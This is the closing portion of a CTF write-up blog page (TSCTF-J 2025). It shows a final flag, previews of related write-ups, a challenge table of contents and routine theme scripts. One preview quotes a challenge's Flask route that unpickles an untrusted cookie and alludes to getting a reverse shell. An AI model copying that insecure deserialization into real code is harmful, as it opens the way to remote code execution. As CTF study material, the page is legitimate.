<p>TSCTF-J{u0real_or_R1AL?!_and_here}</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://matriy330.github.io">Matriy</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://matriy330.github.io/ae56c8ab/">http://matriy330.github.io/ae56c8ab/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://matriy330.github.io" target="_blank">Matriy's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/wp/">wp</a></div><div class="post-share"><div class="social-share" data-image="/img/tx.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i>赞助</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/zsm.jpg" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/zsm.jpg" alt="wechat"/></a><div class="post-qr-code-desc">wechat</div></li><li class="reward-item"><a href="/img/zfb.jpg" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/zfb.jpg" alt="alipay"/></a><div class="post-qr-code-desc">alipay</div></li></ul></div></div><nav class="pagination-post" id="pagination"></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/f31bf17e/" title="2025 UCSC CTF WriteUp"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/a01a8f5e-5a94-4f0d-9016-1c2c7a0bfb39.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-04-20</div><div class="info-item-2">2025 UCSC CTF WriteUp</div></div><div class="info-2"><div class="info-item-1">2025 UCSC CTF wp  Reverseeasy_re-ucsc简单异或 1234enc = &#x27;&#x27;&#x27;n=&lt;;:h2&lt;&#x27;?8:?&#x27;9hl9&#x27;h:l&gt;&#x27;2&gt;&gt;2&gt;hk=&gt;;:?&#x27;&#x27;&#x27;for i in range(0,len(enc)):    print(chr(ord(enc[i]) ^ 10),end=&#x27;&#x27;)  flag{d7610b86-5205-3bf3-b0f4-84484ba74105} EZ_debug-ucscdebug能看结果，下断点道最后就行，直接看 123for i in range(0,len(enc)):    print(chr(enc[i]),end=&#x27;&#x27;)  flag{709e9bdd-0858-9750-8c37-9b135b31f16d} simplere-ucsc...</div></div></div></a><a class="pagination-related" href="/9f6ee0bf/" title="BUUCTF-re-page1"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250108211506668.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-02-25</div><div class="info-item-2">BUUCTF-re-page1</div></div><div class="info-2"><div class="info-item-1">BUUCTF-re-page1easyre 提交 reverse1跟进Str2，加flag   瞎了，上面还有个如果是o就换成0，改一改提交 {hell0_w0rld} reverse2flag：{hacking_for_fun} 但做了替换  flag{hack1ng_fo1_fun} 内涵的软件DBAPP{49d3c93df25caad81232130f3d2ebfad} flag{49d3c93df25caad81232130f3d2ebfad} 新年快乐upx壳，工具脱壳 xor 有个异或逻辑 跟进global  12345678910111213enc = [  0x66, 0x0A, 0x6B, 0x0C, 0x77, 0x26, 0x4F, 0x2E, 0x40, 0x11,  0x78, 0x0D, 0x5A, 0x3B, 0x55, 0x11, 0x70, 0x19, 0x46, 0x1F,  0x76, 0x22, 0x4D, 0x23, 0x44, 0x0E, 0x67, 0x06, 0x68, 0x0F,  0x47, 0x32, 0x4F]for i...</div></div></div></a><a class="pagination-related" href="/c510533a/" title="DASCTF 2024最后一战 wp(复现)"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250506151553502.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-05-03</div><div class="info-item-2">DASCTF 2024最后一战 wp(复现)</div></div><div class="info-2"><div class="info-item-1">DASCTF 2024最后一战 wp(复现)checkin 访问即可  西湖论剑邀请函获取器get_env(name &#x3D; “FLAG”)即可 Webconst_python123456# 假设存在如下路由处理@app.route(&#x27;/load&#x27;)def load_data():    data = base64.b64decode(request.cookies.get(&#x27;data&#x27;))    obj = pickle.loads(data)     return &quot;Loaded&quot;  题目导入了 pickle、base64 等模块，且存在动态数据处理逻辑（如 Session 管理、身份验证），可能通过反序列化传递对象。 Pickle 协议的本质：Pickle 不是简单的数据序列化，而是能重建任意对象的协议。反序列化时会自动调用 __reduce__ 方法，该方法返回一个可执行函数和参数元组。 在线反弹shell生成工具 – Zgao’s...</div></div></div></a><a class="pagination-related" href="/2ade85f8/" title="DASCTF 2023 10 wp"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-10-03</div><div class="info-item-2">DASCTF 2023 10 wp</div></div><div class="info-2"><div class="info-item-1">DASCTF 2023 10 wpauuuu3通过解析autoit动态脚本语言执行命令，先安装这个工具 https://github.com/nazywam/AutoIt-Ripper 在Scripts文件夹中找到autoit-ripper.exe程序，按照语法输入得到script.au3文件 得到的au3文件分析加密的流程: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849Func ENC ( $DATA , $KEY )	$DATA = Binary ( $DATA )	Local $DATALEN = BinaryLen ( $DATA )	If $DATALEN = 0 Then		Return &quot;&quot;	ElseIf $DATALEN &lt; 8 Then		$DATALEN = 8	EndIf	Local $OPCODE =...</div></div></div></a><a class="pagination-related" href="/f1dd543a/" title="DASCTF 2025上半年赛-re"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/1.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-02</div><div class="info-item-2">DASCTF 2025上半年赛-re</div></div><div class="info-2"><div class="info-item-1">DASCTF 2025上半年赛-re鱼音乐直接解Exe后pyc反编译得到 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071# uncompyle6 version 3.9.2# Python bytecode version base 3.8.0 (3413)# Decompiled from: Python 3.6.12 (default, Feb  9 2021, 09:19:15)# [GCC 8.3.0]# Embedded file name: main.pyimport sys, osfrom PyQt5.QtWidgets import QApplication, QMainWindow, QWidget, QPushButton, QLabel, QVBoxLayout, QFileDialog, QMessageBoxfrom...</div></div></div></a><a class="pagination-related" href="/fab00bb3/" title="GeekGame 2025 re wp"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-10-25</div><div class="info-item-2">GeekGame 2025 re wp</div></div><div class="info-2"><div class="info-item-1">GeekGame 2025 re wp签到 在线网站把所有帧提出来，第一个帧是背景可以写个妙妙小脚本 1234567891011121314151617181920212223242526272829from PIL import Image, ImageChopsimport numpy as np# 文件名background_path = &quot;1.png&quot;layers = [f&quot;&#123;i&#125;.png&quot; for i in range(2, 10)]# 读取背景图background = Image.open(background_path).convert(&quot;L&quot;)  # 转灰度# 初始化一个全白背景result = Image.new(&quot;L&quot;, background.size, 255)# 处理每一层for path in layers:    img = Image.open(path).convert(&quot;L&quot;)    # 与背景做差    diff =...</div></div></div></a></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/tx.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Matriy</div><div class="author-info-description">不积硅步，无以至千里</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">229</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">13</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Matriy330"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">正在学习安卓逆向 (*^_^*)</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#TSCTF-J-2025-wp"><span class="toc-text">TSCTF-J 2025 wp</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto"><span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sign-in"><span class="toc-text">sign in</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#p-q"><span class="toc-text">p&#x3D;~q</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Cantor%E2%80%99s-gifts"><span class="toc-text">Cantor’s gifts</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%87%8E%E7%8B%90%E7%A6%85"><span class="toc-text">野狐禅</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Microsoft%E2%80%99s-gifts"><span class="toc-text">Microsoft’s gifts</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISC"><span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E6%9F%A5%E9%97%AE%E5%8D%B7"><span class="toc-text">调查问卷</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8D%A2%E6%A3%AE%E5%A0%A1%E7%9A%84%E7%A7%98%E5%AF%86"><span class="toc-text">卢森堡的秘密</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Meow"><span class="toc-text">Meow</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pwn"><span class="toc-text">Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ret"><span class="toc-text">ret</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pop"><span class="toc-text">pop</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Easy-syscall"><span class="toc-text">Easy-syscall</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#EZ-SQL"><span class="toc-text">EZ_SQL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EZ-Login%EF%BC%88%E7%AD%BE%E5%88%B0"><span class="toc-text">EZ_Login（签到)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Druid"><span class="toc-text">Druid</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EZ-PY"><span class="toc-text">EZ_PY</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FileSystem"><span class="toc-text">FileSystem</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#AI"><span class="toc-text">AI</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#JustReverse"><span class="toc-text">JustReverse</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Re"><span class="toc-text">Re</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Singin"><span class="toc-text">Singin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CryDancing"><span class="toc-text">CryDancing</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%AC%E7%BB%BF%E7%9A%84%E7%A7%98%E5%AF%86"><span class="toc-text">听绿的秘密</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Handler%E2%80%99s-Whisper"><span class="toc-text">Handler’s Whisper</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%93%AD%E6%B3%A3%E4%B9%8B%E5%AD%90"><span class="toc-text">哭泣之子</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%A9%E5%A0%82%E4%B9%8B%E9%97%A8"><span class="toc-text">天堂之门</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GrilHook"><span class="toc-text">GrilHook</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Catbits"><span class="toc-text">Catbits</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#The-Loom-of-Mirrored-Dreams"><span class="toc-text">The Loom of Mirrored Dreams</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-re"><span class="toc-text">ez_re</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%82%A3%E4%BA%9B%E5%8A%AA%E5%8A%9B%E8%BF%87%E6%B2%A1%E5%87%BA%E7%9A%84%E9%A2%98"><span class="toc-text">那些努力过没出的题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Python%E2%80%99s-Shed-Skin"><span class="toc-text">Python’s Shed Skin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Overwatch"><span class="toc-text">Overwatch</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/b6dfbc54/" title="一道题浅析LD_PRELOAD文件劫持 /proc/self/status反反调试">一道题浅析LD_PRELOAD文件劫持 /proc/self/status反反调试</a><time datetime="2025-10-26T11:32:14.000Z" title="发表于 2025-10-26 19:32:14">2025-10-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/fab00bb3/" title="GeekGame 2025 re wp">GeekGame 2025 re wp</a><time datetime="2025-10-25T10:22:34.000Z" title="发表于 2025-10-25 18:22:34">2025-10-25</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/519e5256/" title="SUSCTF 2025 wp">SUSCTF 2025 wp</a><time datetime="2025-10-18T15:00:00.000Z" title="发表于 2025-10-18 23:00:00">2025-10-18</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/791560d6/" title="UE4逆向初探-OverWatch">UE4逆向初探-OverWatch</a><time datetime="2025-10-14T15:07:30.000Z" title="发表于 2025-10-14 23:07:30">2025-10-14</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/ae56c8ab/" title="TSCTF-J 2025 wp">TSCTF-J 2025 wp</a><time datetime="2025-10-13T15:00:00.000Z" title="发表于 2025-10-13 23:00:00">2025-10-13</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2024 - 2025 By Matriy</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text"><p><a style="margin-inline:5px"target="_blank" href="https://hexo.io/"><img no-lazy src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Frame-Hexo-blue?style=flat&logo=hexo" title="博客框架为 Hexo" alt="HEXO"></a><a style="margin-inline:5px"target="_blank" href="https://butterfly.js.org/"><img no-lazy src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Theme-Butterfly-6513df?style=flat&logo=bitdefender" title="主题采用 Butterfly" alt="Butterfly"></a><a style="margin-inline:5px"target="_blank" href="https://www.jsdelivr.com/"><img no-lazy src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/CDN-jsDelivr-orange?style=flat&logo=jsDelivr" title="本站使用 Jsdelivr 为静态资源提供CDN加速" alt="Jsdelivr"></a><a style="margin-inline:5px"target="_blank" href="https://github.com/"><img no-lazy src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Source-Github-d021d6?style=flat&logo=GitHub" title="本站项目由 GitHub 托管" alt="GitHub"></a><a style="margin-inline:5px"target="_blank"href="http://creativecommons.org/licenses/by-nc-sa/4.0/"><img no-lazy src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Copyright-BY--NC--SA%204.0-d42328?style=flat&logo=Claris" alt="img" title="本站采用知识共享署名-非商业性使用-相同方式共享4.0国际许可协议进行许可"></a></p> <p>Hi, welcome to Matriy's <a target="_blank" rel="noopener" href="https://butterfly.js.org/">blog</a>!</p></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">簡</button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="前往评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><div class="js-pjax"><script>(() => {
  const isShuoshuo = GLOBAL_CONFIG_SITE.pageType === 'shuoshuo'
  const option = null

  const getCount = () => {
    const countELement = document.getElementById('twikoo-count')
    if(!countELement) return
    twikoo.getCommentsCount({
      envId: 'https://twikoo.open-ctf.top/',
      region: '',
      urls: [window.location.pathname],
      includeReply: false
    }).then(res => {
      countELement.textContent = res[0].count
    }).catch(err => {
      console.error(err)
    })
  }

  const init = (el = document, path = location.pathname) => {
    twikoo.init({
      el: el.querySelector('#twikoo-wrap'),
      envId: 'https://twikoo.open-ctf.top/',
      region: '',
      onCommentLoaded: () => {
        btf.loadLightbox(document.querySelectorAll('#twikoo .tk-content img:not(.tk-owo-emotion)'))
      },
      ...option,
      path: isShuoshuo ? path : (option && option.path) || path
    })

    GLOBAL_CONFIG_SITE.pageType === 'post' && getCount()

    isShuoshuo && (window.shuoshuoComment.destroyTwikoo = () => {
      if (el.children.length) {
        el.innerHTML = ''
        el.classList.add('no-comment')
      }
    })
  }

  const loadTwikoo = (el, path) => {
    if (typeof twikoo === 'object') setTimeout(() => init(el, path), 0)
    else btf.getScript('https://cdn.jsdelivr.net/npm/twikoo/dist/twikoo.all.min.js').then(() => init(el, path))
  }

  if (isShuoshuo) {
    'Twikoo' === 'Twikoo'
      ? window.shuoshuoComment = { loadComment: loadTwikoo }
      : window.loadOtherComment = loadTwikoo
    return
  }

  if ('Twikoo' === 'Twikoo' || !false) {
    if (false) btf.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
    else loadTwikoo()
  } else {
    window.loadOtherComment = loadTwikoo
  }
})()</script></div><script async data-pjax src="/js/anzhiyu.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = false;
POWERMODE.mobile = false;
document.body.addEventListener('input', POWERMODE);
</script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-heart.min.js" async="async" mobile="false"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><script>(() => {
  const destroyAplayer = () => {
    if (window.aplayers) {
      for (let i = 0; i < window.aplayers.length; i++) {
        if (!window.aplayers[i].options.fixed) {
          window.aplayers[i].destroy()
        }
      }
    }
  }

  const runMetingJS = () => {
    typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
  }

  btf.addGlobalFn('pjaxSend', destroyAplayer, 'destroyAplayer')
  btf.addGlobalFn('pjaxComplete', loadMeting, 'runMetingJS')
})()</script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>(() => {
  const pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]

  window.pjax = new Pjax({
    elements: 'a:not([target="_blank"]):not([href="/music/"])',
    selectors: pjaxSelectors,
    cacheBust: false,
    analytics: false,
    scrollRestoration: false
  })

  const triggerPjaxFn = (val) => {
    if (!val) return
    Object.values(val).forEach(fn => fn())
  }

  document.addEventListener('pjax:send', () => {
    // removeEventListener
    btf.removeGlobalFnEvent('pjaxSendOnce')
    btf.removeGlobalFnEvent('themeChange')

    // reset readmode
    const $bodyClassList = document.body.classList
    if ($bodyClassList.contains('read-mode')) $bodyClassList.remove('read-mode')

    triggerPjaxFn(window.globalFn.pjaxSend)
  })

  document.addEventListener('pjax:complete', () => {
    btf.removeGlobalFnEvent('pjaxCompleteOnce')
    document.querySelectorAll('script[data-pjax]').forEach(item => {
      const newScript = document.createElement('script')
      const content = item.text || item.textContent || item.innerHTML || ""
      Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
      newScript.appendChild(document.createTextNode(content))
      item.parentNode.replaceChild(newScript, item)
    })

    triggerPjaxFn(window.globalFn.pjaxComplete)
  })

  document.addEventListener('pjax:error', e => {
    if (e.request.status === 404) {
      pjax.loadUrl('/404.html')
    }
  })
})()</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>